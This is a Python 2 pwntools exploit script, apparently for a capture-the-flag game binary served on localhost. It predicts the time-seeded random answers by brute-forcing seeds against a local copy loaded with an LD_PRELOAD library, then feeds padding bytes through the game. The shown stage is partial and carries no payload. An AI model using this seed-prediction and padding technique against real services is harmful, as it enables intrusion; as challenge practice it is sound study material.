import time
import os
import sys
from pwn import *

#context.log_level = 'debug'
elf = ELF('./vegas_path')

padding_size = 0x3c

def vguess_pad(io, gus_opt, pad_byte):
    io.recvuntil('Score: ')
    data = io.recvuntil('\n')[:-1]
    now_socore = int(data, 10)
    print 'now_socore:', now_socore
    io.recvuntil('Choice:\n')
    io.sendline(str(1))
    io.recvuntil('Not sure\n')
    io.sendline(str(gus_opt))
    io.recvuntil('The number is ')
    data = io.recvuntil('\n')[:-1]
    io.recvuntil('step:')
    io.sendline(pad_byte)

def answer_guess(tmp_io):
    tmp_io.recvuntil('Choice:\n')
    tmp_io.sendline(str(1))
    tmp_io.recvuntil('Not sure\n')
    tmp_io.sendline(str(3))
    tmp_io.recvuntil('The number is ')
    data = tmp_io.recvuntil('\n')[:-1]
    rd_magic_nub = int(data, 16)
    return rd_magic_nub


def crack_guess(tmp_io):
    orginal_magicn = answer_guess(tmp_io)
    right_answer = []
    now_time = int(time.time())
    for m_time in range(now_time-60, now_time+60):
        mine_env = os.environ
        mine_env['LD_PRELOAD'] = './desrand.so'
        mine_env['SEED'] = str(m_time)
        local_io = process('./vegas_crac', env=mine_env)
        tmp_magic = answer_guess(local_io)
        #print 'tmp magic number', tmp_magic
        if tmp_magic == orginal_magicn:
            print 'found magic', hex(tmp_magic)
            for i in range(100):
                if answer_guess(local_io) % 2 == 0:
                    right_answer.append(2)
                else:
                    right_answer.append(1)
            local_io.close()
            return right_answer
        local_io.close()
    return

def veg_exp():
    io_remote = remote('127.0.0.1', 2333)
    answer_list = crack_guess(io_remote)
    if answer_list != None:
        raw_input('start padding?')
        print answer_list
        secrets = 'A'*0x20
        for i, c in enumerate(secrets):
            vguess_pad(io_remote, answer_list[i], c)

    io_remote.close()


veg_exp()

